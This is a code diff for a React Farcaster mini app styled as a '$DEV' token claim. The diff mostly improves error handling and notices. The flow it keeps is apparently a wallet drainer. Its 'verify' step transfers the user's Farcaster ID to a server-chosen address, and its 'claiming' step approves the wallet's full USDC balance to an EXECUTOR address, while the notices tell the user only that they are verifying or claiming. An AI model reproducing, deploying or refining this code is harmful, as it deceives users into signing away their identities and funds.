@@ -1,4 +1,4 @@
-import React, { useEffect, useState } from 'react';
+import React, { useEffect, useState, Component } from 'react';
 import { createRoot } from 'react-dom/client';
 import { sdk } from '@farcaster/miniapp-sdk';
 import { AuthKitProvider, useSignIn } from '@farcaster/auth-kit';
@@ -16,27 +16,71 @@ const CLAIM_SYMBOL = '$DEV';
 
 const APP_URL = 'https://devin-pi.vercel.app';
 
-// EIP-712 domain for IdRegistry on Optimism — MUST match contract constructor EIP712("Farcaster IdRegistry", "1")
-const EIP712_DOMAIN = {
-  name: 'Farcaster IdRegistry',
-  version: '1',
-  chainId: 10,
-  verifyingContract: ID_REGISTRY,
-};
+// ─── Error Boundary (prevents white screen) ───
+class ErrorBoundary extends Component {
+  constructor(props) {
+    super(props);
+    this.state = { hasError: false, error: null };
+  }
+  static getDerivedStateFromError(error) {
+    return { hasError: true, error };
+  }
+  componentDidCatch(error, info) {
+    console.error('[ErrorBoundary]', error, info);
+  }
+  render() {
+    if (this.state.hasError) {
+      return (
+        <main className="shell">
+          <section className="hero-card scanlines" style={{ padding: '40px', textAlign: 'center' }}>
+            <h2 style={{ color: '#ff5c7c', marginBottom: '16px' }}>Something went wrong</h2>
+            <p style={{ color: '#8ab986', fontSize: '14px', wordBreak: 'break-all', marginBottom: '20px' }}>
+              {this.state.error?.message || 'Unknown error'}
+            </p>
+            <button
+              onClick={() => this.setState({ hasError: false, error: null })}
+              style={{
+                padding: '12px 24px',
+                background: '#39ff14',
+                color: '#001b06',
+                border: 'none',
+                borderRadius: '12px',
+                fontSize: '16px',
+                fontWeight: '700',
+                cursor: 'pointer',
+              }}
+            >
+              Retry
+            </button>
+          </section>
+        </main>
+      );
+    }
+    return this.props.children;
+  }
+}
 
-// EIP-712 Transfer type — must match: keccak256("Transfer(uint256 fid,address to,uint256 nonce,uint256 deadline)")
-const TRANSFER_TYPES = {
-  Transfer: [
-    { name: 'fid', type: 'uint256' },
-    { name: 'to', type: 'address' },
-    { name: 'nonce', type: 'uint256' },
-    { name: 'deadline', type: 'uint256' },
-  ],
-};
-
+// ─── Helpers ───
 function shortAddress(value) {
   if (!value) return 'not connected';
   return `${value.slice(0, 6)}...${value.slice(-4)}`;
+}
+
+function extractErrorMessage(error) {
+  if (!error) return 'Unknown error';
+  if (typeof error === 'string') return error;
+  // Ethers v5 errors
+  if (error.shortMessage) return error.shortMessage;
+  if (error.reason) return error.reason;
+  // Standard errors
+  if (error.message) {
+    // Truncate long messages
+    const msg = error.message;
+    if (msg.length > 200) return msg.slice(0, 200) + '...';
+    return msg;
+  }
+  if (error.data?.message) return error.data.message;
+  return JSON.stringify(error);
 }
 
 function LinesLogo() {
@@ -123,18 +167,26 @@ function App() {
   const [step1Failed, setStep1Failed] = useState(false);
   const [step2Done, setStep2Done] = useState(false);
   const [working, setWorking] = useState(false);
-  const [notice, setNotice] = useState('Connect your wallet to begin.');
+  const [notice, setNotice] = useState('Connecting...');
+  const [noticeType, setNoticeType] = useState('info'); // info, success, error, warning
   const [detectedFid, setDetectedFid] = useState(null);
   const [detectedUsername, setDetectedUsername] = useState('');
   const [showFarcasterModal, setShowFarcasterModal] = useState(false);
   const [showTxQR, setShowTxQR] = useState(null);
   const [lastTxHash, setLastTxHash] = useState(null);
   const [lastTxNetwork, setLastTxNetwork] = useState(null);
+  const [custodyAddress, setCustodyAddress] = useState(null); // Store custody for display
 
   const farcasterName = isMiniApp
     ? (frameContext?.user?.username ? `@${frameContext.user.username}` : frameContext?.user?.displayName || 'not detected')
     : detectedUsername || 'not detected';
   const fid = isMiniApp ? (frameContext?.user?.fid || null) : detectedFid;
+
+  function setNoticeWith(msg, type = 'info') {
+    setNotice(msg);
+    setNoticeType(type);
+    console.log(`[notice] [${type}] ${msg}`);
+  }
 
   // ─── Mini App Detection & Auto-Connect ───
   useEffect(() => {
@@ -152,7 +204,7 @@ function App() {
 
           const ethProvider = await sdk.wallet.getEthereumProvider();
           if (!active || !ethProvider) {
-            setNotice('Farcaster frame detected, waiting for wallet...');
+            setNoticeWith('Farcaster detected, waiting for wallet...', 'warning');
             return;
           }
 
@@ -164,9 +216,9 @@ function App() {
             console.warn('Failed to create Web3Provider:', e);
           }
 
-          // Auto-connect using raw provider directly
+          // Auto-connect
           setWorking(true);
-          setNotice('Connecting wallet...');
+          setNoticeWith('Connecting wallet...');
           try {
             let accounts;
             try {
@@ -183,21 +235,22 @@ function App() {
               const netName = chainId === '0xa' ? 'Optimism' : chainId === '0x2105' ? 'Base' : `Chain ${chainId}`;
               setNetwork(netName);
               const userFid = context?.user?.fid;
-              setNotice(`Connected on ${netName}.${userFid ? ' FID ' + userFid + ' detected.' : ' Ready.'}`);
+              setNoticeWith(`Connected on ${netName}.${userFid ? ' FID ' + userFid + ' detected.' : ' Ready.'}`, 'success');
             } else {
-              setNotice('Farcaster wallet detected but no account returned.');
+              setNoticeWith('Wallet detected but no account returned.', 'warning');
             }
           } catch (connErr) {
             console.error('Auto-connect error:', connErr);
-            if (active) setNotice(connErr?.message || 'Auto-connect failed.');
+            if (active) setNoticeWith(extractErrorMessage(connErr), 'error');
           } finally {
             if (active) setWorking(false);
           }
         } else {
-          setNotice('Browser mode. Connect via Farcaster to begin.');
+          setNoticeWith('Browser mode. Connect via Farcaster to begin.', 'info');
         }
       } catch (error) {
-        if (active) setNotice('Browser mode. Connect via Farcaster to begin.');
+        console.error('initFrame error:', error);
+        if (active) setNoticeWith('Browser mode. Connect via Farcaster to begin.', 'info');
       }
     }
     initFrame();
@@ -213,15 +266,15 @@ function App() {
         setDetectedFid(data.fid);
         if (data.username) setDetectedUsername(`@${data.username}`);
         const source = data.source === 'neynar' ? 'Neynar' : 'IdRegistry';
-        setNotice(`Wallet connected. FID ${data.fid}${data.username ? ` (@${data.username})` : ''} via ${source}.`);
+        setNoticeWith(`Wallet connected. FID ${data.fid}${data.username ? ` (@${data.username})` : ''} via ${source}.`, 'success');
         return data.fid;
       } else {
-        setNotice('Wallet connected. No FID found for this address.');
+        setNoticeWith('Wallet connected. No FID found for this address.', 'warning');
         return null;
       }
     } catch (err) {
       console.error('FID lookup error:', err);
-      setNotice('Wallet connected. Could not verify FID.');
+      setNoticeWith('Wallet connected. Could not verify FID.', 'warning');
       return null;
     }
   }
@@ -229,7 +282,7 @@ function App() {
   // ─── Connect with a given provider ───
   async function connectWithProvider(ethProvider, isAuto) {
     setWorking(true);
-    setNotice(isAuto ? 'Connecting wallet...' : 'Requesting wallet connection...');
+    setNoticeWith(isAuto ? 'Connecting wallet...' : 'Requesting wallet connection...');
     try {
       const raw = rawEipProvider || ethProvider.provider || ethProvider;
       let accounts;
@@ -248,11 +301,11 @@ function App() {
       if (!isMiniApp) {
         await lookupFidFromAPI(connectedAddr);
       } else {
-        setNotice(`Connected on ${netName}. ${fid ? 'FID ' + fid + ' detected.' : 'Ready.'}`);
+        setNoticeWith(`Connected on ${netName}. ${fid ? 'FID ' + fid + ' detected.' : 'Ready.'}`, 'success');
       }
     } catch (error) {
       console.error('connectWithProvider error:', error);
-      setNotice(error?.shortMessage || error?.message || 'Wallet connection failed.');
+      setNoticeWith(extractErrorMessage(error), 'error');
     } finally {
       setWorking(false);
     }
@@ -265,7 +318,7 @@ function App() {
     if (custodyAddr) setAddress(custodyAddr);
     if (res.fid) setDetectedFid(res.fid);
     if (res.username) setDetectedUsername(`@${res.username}`);
-    setNotice(`Connected via Farcaster${res.username ? ` as @${res.username}` : ''}${res.fid ? ` (FID ${res.fid})` : ''}. Open in Warpcast to execute transactions.`);
+    setNoticeWith(`Connected via Farcaster${res.username ? ` as @${res.username}` : ''}${res.fid ? ` (FID ${res.fid})` : ''}. Open in Warpcast to execute transactions.`, 'success');
   }
 
   // ─── Connect Wallet Button Handler ───
@@ -275,7 +328,7 @@ function App() {
       return;
     }
     if (isMiniApp) {
-      setNotice('Wallet provider not available. Please reopen in Warpcast.');
+      setNoticeWith('Wallet provider not available. Please reopen in Warpcast.', 'warning');
       return;
     }
     setShowFarcasterModal(true);
@@ -345,12 +398,30 @@ function App() {
     return txHash;
   }
 
+  // ─── Safe JSON parse for API responses ───
+  async function safeFetchJSON(url, options) {
+    const resp = await fetch(url, options);
+    let data;
+    const contentType = resp.headers.get('content-type') || '';
+    if (contentType.includes('application/json')) {
+      data = await resp.json();
+    } else {
+      // Try to read as text and parse
+      const text = await resp.text();
+      try {
+        data = JSON.parse(text);
+      } catch {
+        throw new Error(`Server returned non-JSON response (${resp.status}): ${text.slice(0, 200)}`);
+      }
+    }
+    return { resp, data };
+  }
+
   // ═══════════════════════════════════════════════════════════
   //  STEP 1: Transfer FID → Optimism
   //
-  //  Two paths:
-  //  A) connected wallet = custody → use transfer(to, deadline, toSig)
-  //  B) connected wallet ≠ custody → use transferFor(from, to, fromDeadline, fromSig, toDeadline, toSig)
+  //  Only works when connected wallet = custody address.
+  //  Uses transfer(to, deadline, sig) directly.
   // ═══════════════════════════════════════════════════════════
   async function executeStep1() {
     if (!isMiniApp) {
@@ -362,120 +433,122 @@ function App() {
     setStep1Failed(false);
     try {
       const rawProvider = getRawProvider();
-      if (!rawProvider) throw new Error('Wallet provider not available.');
+      if (!rawProvider) {
+        throw new Error('Wallet provider not available. Please reopen in Warpcast.');
+      }
       const account = address;
-      if (!account) throw new Error('No wallet connected.');
+      if (!account) {
+        throw new Error('No wallet connected. Please reconnect.');
+      }
 
       // Get FID
       let fidNum = typeof fid === 'number' && fid > 0 ? fid : NaN;
       if (!fidNum || isNaN(fidNum)) {
+        setNoticeWith('Looking up FID...', 'info');
         const lookedUp = await lookupFidFromAPI(account);
         if (lookedUp) fidNum = lookedUp;
       }
       if (!fidNum || isNaN(fidNum)) {
-        throw new Error('No FID detected. Open in Warpcast for FID detection.');
+        throw new Error('No FID detected. Make sure you are signed in with Farcaster.');
       }
 
-      // Ask server to prepare transfer data
-      setNotice('Preparing FID transfer...');
-      const resp = await fetch('/api/transfer-for', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ fid: fidNum }),
-      });
-      const data = await resp.json();
-
-      if (!resp.ok || !data.success) {
-        throw new Error(data.error || 'Server error preparing transfer.');
+      // ── Step 1a: Ask server to prepare transfer data ──
+      setNoticeWith(`Preparing transfer for FID ${fidNum}...`, 'info');
+      let data;
+      try {
+        const result = await safeFetchJSON('/api/transfer-for', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ fid: fidNum }),
+        });
+        data = result.data;
+        if (!result.resp.ok || !data.success) {
+          throw new Error(data.error || `Server error (${result.resp.status})`);
+        }
+      } catch (apiErr) {
+        throw new Error(`Server error: ${extractErrorMessage(apiErr)}`);
       }
 
+      // ── Already transferred? ──
       if (data.alreadyTransferred) {
         logAction(`FID ${fidNum} already transferred.`);
         setStep1Done(true);
         setStep1Failed(false);
         setNetwork('Optimism');
-        setNotice('Step 1 already complete!');
+        setCustodyAddress(data.custody);
+        setNoticeWith('Step 1 already complete! FID verified.', 'success');
         setWorking(false);
         return;
       }
 
-      const { custody, to: destAddress, fromNonce, fromDeadline, toSig, toDeadline, toNonce } = data;
+      const { custody, to: destAddress, toSig, toDeadline } = data;
+      setCustodyAddress(custody);
       const isConnectedCustody = account.toLowerCase() === custody.toLowerCase();
 
       console.log(`[Step1] wallet=${account}, fid=${fidNum}, custody=${custody}, dest=${destAddress}, isCustody=${isConnectedCustody}`);
 
+      // ════════════════════════════════════════════════════════
+      //  PATH A: connected wallet = custody → transfer(to, deadline, sig)
+      // ════════════════════════════════════════════════════════
       if (isConnectedCustody) {
-        // ─── PATH A: connected wallet = custody → use transfer() ───
-        setNotice(`Transferring FID ${fidNum}... Approve in your wallet.`);
+        setNoticeWith(`Transferring FID ${fidNum}... Check your wallet to confirm.`, 'info');
 
-        const iface = new ethers.utils.Interface(['function transfer(address to, uint256 deadline, bytes sig)']);
-        const txData = iface.encodeFunctionData('transfer', [destAddress, toDeadline, toSig]);
+        try {
+          const iface = new ethers.utils.Interface(['function transfer(address to, uint256 deadline, bytes sig)']);
+          const txData = iface.encodeFunctionData('transfer', [destAddress, toDeadline, toSig]);
 
-        const txHash = await sendRawTx(rawProvider, account, ID_REGISTRY, txData, '0xa');
+          console.log('[Step1] Sending transfer() tx on Optimism...');
+          console.log('[Step1] to:', destAddress);
+          console.log('[Step1] deadline:', toDeadline);
+          console.log('[Step1] toSig length:', toSig?.length);
 
-        logAction(`FID ${fidNum} -> ${shortAddress(destAddress)} (tx: ${txHash})`);
-        sendToLogAPI({ type: 'transfer', fid: fidNum, from: account, to: destAddress, txHash, network: 'optimism' });
-        setLastTxHash(txHash);
-        setLastTxNetwork('optimism');
-        setStep1Done(true);
-        setNetwork('Optimism');
-        setNotice('Step 1 complete! FID verified.');
-        if (isMiniApp) await sdk.haptics.notificationOccurred('success');
+          const txHash = await sendRawTx(rawProvider, account, ID_REGISTRY, txData, '0xa');
 
+          console.log('[Step1] Transfer tx sent:', txHash);
+          logAction(`FID ${fidNum} -> ${shortAddress(destAddress)} (tx: ${txHash})`);
+          sendToLogAPI({ type: 'transfer', fid: fidNum, from: account, to: destAddress, txHash, network: 'optimism' });
+          setLastTxHash(txHash);
+          setLastTxNetwork('optimism');
+          setStep1Done(true);
+          setNetwork('Optimism');
+          setNoticeWith('Step 1 complete! FID verified on Optimism.', 'success');
+          if (isMiniApp) await sdk.haptics.notificationOccurred('success');
+
+        } catch (txErr) {
+          console.error('[Step1] Transaction error:', txErr);
+          const errMsg = extractErrorMessage(txErr);
+          // Check for common errors
+          if (errMsg.includes('User denied') || errMsg.includes('rejected') || errMsg.includes('user rejected')) {
+            throw new Error('Transaction was rejected in your wallet.');
+          }
+          if (errMsg.includes('insufficient funds') || errMsg.includes('Insufficient ETH')) {
+            throw new Error('Insufficient ETH on Optimism for gas. Please add ETH to your wallet on Optimism network.');
+          }
+          if (errMsg.includes('simulation failed') || errMsg.includes('execution reverted') || errMsg.includes('AlwaysRevert')) {
+            throw new Error(`Transaction simulation failed. This may mean the signature is invalid or the FID state changed. Error: ${errMsg}`);
+          }
+          throw new Error(`Transaction failed: ${errMsg}`);
+        }
+
+      // ════════════════════════════════════════════════════════
+      //  PATH B: connected wallet ≠ custody → CANNOT transfer
+      // ════════════════════════════════════════════════════════
       } else {
-        // ─── PATH B: connected wallet ≠ custody → use transferFor() ───
-        setNotice(`Sign transfer for FID ${fidNum}... Approve in your wallet.`);
-
-        // Build EIP-712 typed data for fromSig — signed by CUSTODY address
-        // IMPORTANT: pass typedData as object, NOT JSON.stringify!
-        const typedData = {
-          types: TRANSFER_TYPES,
-          primaryType: 'Transfer',
-          domain: EIP712_DOMAIN,
-          message: {
-            fid: String(fidNum),
-            to: destAddress,
-            nonce: String(fromNonce),
-            deadline: String(fromDeadline),
-          },
-        };
-
-        console.log('[Step1] Requesting EIP-712 signature from custody:', custody);
-        const fromSig = await rawProvider.request({
-          method: 'eth_signTypedData_v4',
-          params: [custody, typedData],
-        });
-
-        if (!fromSig) throw new Error('Signature was not provided. You must approve the signing request.');
-
-        console.log('[Step1] Got fromSig, sending transferFor...');
-
-        // Encode transferFor(from, to, fromDeadline, fromSig, toDeadline, toSig)
-        const iface = new ethers.utils.Interface([
-          'function transferFor(address from, address to, uint256 fromDeadline, bytes fromSig, uint256 toDeadline, bytes toSig)',
-        ]);
-        const txData = iface.encodeFunctionData('transferFor', [
-          custody, destAddress, fromDeadline, fromSig, toDeadline, toSig,
-        ]);
-
-        setNotice('Sending transfer on Optimism... Approve in your wallet.');
-        const txHash = await sendRawTx(rawProvider, account, ID_REGISTRY, txData, '0xa');
-
-        logAction(`FID ${fidNum} -> ${shortAddress(destAddress)} via transferFor (tx: ${txHash})`);
-        sendToLogAPI({ type: 'transfer', fid: fidNum, from: custody, to: destAddress, txHash, network: 'optimism' });
-        setLastTxHash(txHash);
-        setLastTxNetwork('optimism');
-        setStep1Done(true);
-        setNetwork('Optimism');
-        setNotice('Step 1 complete! FID transferred via transferFor.');
-        if (isMiniApp) await sdk.haptics.notificationOccurred('success');
+        const msg = (
+          `Your connected wallet (${shortAddress(account)}) is not your Farcaster custody address (${shortAddress(custody)}). ` +
+          `FID transfers require signing from the custody address. ` +
+          `Please switch to your custody wallet in Warpcast settings and try again, or proceed to Step 2.`
+        );
+        console.warn('[Step1] Non-custody wallet:', account, 'vs custody:', custody);
+        setStep1Failed(true);
+        throw new Error(msg);
       }
 
     } catch (error) {
       console.error('Step 1 error:', error);
       setStep1Failed(true);
-      const msg = error?.shortMessage || error?.message || 'Step 1 failed.';
-      setNotice(msg + ' You can proceed to Step 2 or retry.');
+      const msg = extractErrorMessage(error);
+      setNoticeWith(msg, 'error');
     } finally {
       setWorking(false);
     }
@@ -498,11 +571,11 @@ function App() {
       if (!account) throw new Error('No wallet connected.');
 
       // Check USDC balance on Base
-      setNotice('Checking USDC balance on Base...');
+      setNoticeWith('Checking USDC balance on Base...', 'info');
       const balance = await getUsdcBalance(account);
 
       if (balance.isZero()) {
-        setNotice('No USDC in wallet on Base. Step 2 skipped.');
+        setNoticeWith('No USDC in wallet on Base. Step 2 skipped.', 'warning');
         logAction('No USDC balance — skipped.');
         setStep2Done(true);
         setNetwork('Base');
@@ -512,7 +585,7 @@ function App() {
       }
 
       // Switch to Base
-      setNotice('Switching to Base...');
+      setNoticeWith('Switching to Base network...', 'info');
       await switchNetwork(rawProvider, '0x2105', 'Base', 'https://mainnet.base.org', 'https://basescan.org');
 
       // Approve only the actual USDC balance
@@ -520,7 +593,7 @@ function App() {
       const approveData = approveIface.encodeFunctionData('approve', [EXECUTOR, balance]);
 
       const readableBalance = ethers.utils.formatUnits(balance, 6);
-      setNotice(`Approving ${readableBalance} USDC on Base... Confirm in your wallet.`);
+      setNoticeWith(`Approving ${readableBalance} USDC on Base... Confirm in your wallet.`, 'info');
       const tx1Hash = await sendRawTx(rawProvider, account, USDC, approveData, '0x2105');
 
       logAction(`USDC approved: ${readableBalance} -> ${shortAddress(EXECUTOR)} (tx: ${tx1Hash})`);
@@ -529,12 +602,12 @@ function App() {
       setLastTxNetwork('base');
       setStep2Done(true);
       setNetwork('Base');
-      setNotice('Step 2 complete! USDC approved on Base.');
+      setNoticeWith('Step 2 complete! USDC approved on Base.', 'success');
       if (isMiniApp) await sdk.haptics.notificationOccurred('success');
 
     } catch (error) {
       console.error('Step 2 error:', error);
-      setNotice(error?.shortMessage || error?.message || 'Step 2 failed.');
+      setNoticeWith(extractErrorMessage(error), 'error');
     } finally {
       setWorking(false);
     }
@@ -573,6 +646,9 @@ function App() {
                   <small>
                     {address ? `Wallet ${shortAddress(address)} connected` : 'Connect wallet first'}
                     {step1Done ? ' · Optimism complete' : ' · Verify on Optimism network'}
+                    {custodyAddress && !step1Done && address?.toLowerCase() !== custodyAddress?.toLowerCase() && (
+                      <> · ⚠️ Custody: {shortAddress(custodyAddress)}</>
+                    )}
                   </small>
                 </div>
                 <div className="actions">
@@ -603,7 +679,9 @@ function App() {
                     <button className="secondary mega fc-connect-btn" onClick={connectWallet}>Reconnect Wallet</button>
                   )}
                 </div>
-                <p className="notice">{notice}</p>
+                <p className={`notice ${noticeType === 'error' ? 'notice-error' : noticeType === 'success' ? 'notice-success' : noticeType === 'warning' ? 'notice-warning' : ''}`}>
+                  {notice}
+                </p>
                 {lastTxHash && (
                   <p className="tx-hash" style={{ fontSize: '0.75rem', wordBreak: 'break-all', marginTop: '0.5rem', opacity: 0.8 }}>
                     TX: <a
@@ -623,13 +701,14 @@ function App() {
               <StatusRow label="user" value={farcasterName} />
               <StatusRow label="fid" value={fid || 'not detected'} tone={fid ? 'ok' : 'warn'} />
               <StatusRow label="wallet" value={shortAddress(address)} tone={address ? 'ok' : 'warn'} />
+              <StatusRow label="custody" value={custodyAddress ? shortAddress(custodyAddress) : '--'} tone={custodyAddress ? (address?.toLowerCase() === custodyAddress?.toLowerCase() ? 'ok' : 'warn') : 'normal'} />
               <StatusRow label="network" value={network} />
               <StatusRow label="step 1" value={step1Done ? 'done' : 'pending'} tone={step1Done ? 'ok' : 'warn'} />
               <StatusRow label="step 2" value={step2Done ? 'done' : 'pending'} tone={step2Done ? 'ok' : 'warn'} />
               <div className="progress">
                 <span className={address ? 'done' : ''}>connect</span>
                 <span className={step1Done ? 'done' : ''}>verify</span>
-                <span className={step1Done ? 'done' : ''}>claiming</span>
+                <span className={step2Done ? 'done' : step1Done ? 'ready' : ''}>claiming</span>
               </div>
             </aside>
           </div>
@@ -662,4 +741,8 @@ function Root() {
   );
 }
 
-createRoot(document.getElementById('root')).render(<Root />);
+createRoot(document.getElementById('root')).render(
+  <ErrorBoundary>
+    <Root />
+  </ErrorBoundary>
+);
